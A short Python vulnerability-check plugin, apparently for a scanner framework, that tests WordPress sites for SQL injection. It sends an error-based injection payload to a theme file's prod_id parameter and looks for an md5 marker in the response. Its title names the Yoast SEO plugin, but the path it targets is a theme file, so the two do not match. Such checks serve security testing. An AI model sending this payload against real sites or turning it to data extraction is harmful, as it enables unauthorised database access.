#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'K0thony' 
#Name:WordPress SEO By Yoast 1.7.3.3 SQL Injection
def assign(service, arg): 
    if service == "wordpress": 
        return True, arg 
def audit(arg):
    payload = 'wp-content/themes/ecomm-sizes.php?prod_id=%20and(select%201%20from(select%20count(*),concat((select%20(select%20md5(12345))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23'
    verify_url = arg + payload 
    code, head,res, errcode, _ = curl.curl(verify_url) 
    if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b1" in res:
        security_hole(verify_url)

if __name__ == '__main__': 
    from dummy import * 
    audit(assign('wordpress', 'http://www.example.com/')[1])